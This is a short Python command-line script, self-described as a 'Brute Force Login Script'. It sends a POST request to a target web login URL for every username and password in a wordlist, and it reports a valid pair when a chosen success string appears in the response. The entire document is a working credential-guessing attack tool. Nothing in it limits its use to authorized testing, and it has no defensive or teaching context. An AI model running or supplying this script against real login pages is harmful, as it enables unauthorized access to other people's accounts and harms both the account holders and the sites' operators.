import requests
import sys
import argparse

# Function to perform brute force login
def brute_force_login(target, usernames, passwords_file, needle):
    # Iterate through each username
    for username in usernames:
        # Open the password list file
        with open(passwords_file, 'r') as passwords_list:
            # Iterate through each password in the list
            for password in passwords_list:
                password = password.strip("\n")  # Remove newline character
                # Print attempt information without newline
                print("[X] Attempting user:pass -> {}:{}".format(username, password), end="\r", flush=True)
                try:
                    # Send POST request to the target with username and password
                    response = requests.post(target, data={"username": username, "password": password})
                    # Check if login was successful based on needle string
                    if needle in response.text:
                        # Print success message and exit function if valid password is found
                        print("\n\t[>>>] Valid password '{}' found for user '{}'!".format(password, username))
                        return
                except requests.RequestException as e:
                    # Handle request exception and exit function
                    print("\nRequest failed:", e)
                    return
    # If no valid password is found for any username
    print("\nNo valid password found for any username")

# Main function
def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Brute Force Login Script")
    parser.add_argument("target", help="Target URL for login")
    parser.add_argument("usernames", nargs="+", help="List of usernames to attempt")
    parser.add_argument("passwords_file", help="Path to the file containing passwords")
    parser.add_argument("needle", help="Needle string to identify successful login")
    args = parser.parse_args()

    # Call the brute_force_login function with specified parameters
    brute_force_login(args.target, args.usernames, args.passwords_file, args.needle)

# Entry point
if __name__ == "__main__":
    main()
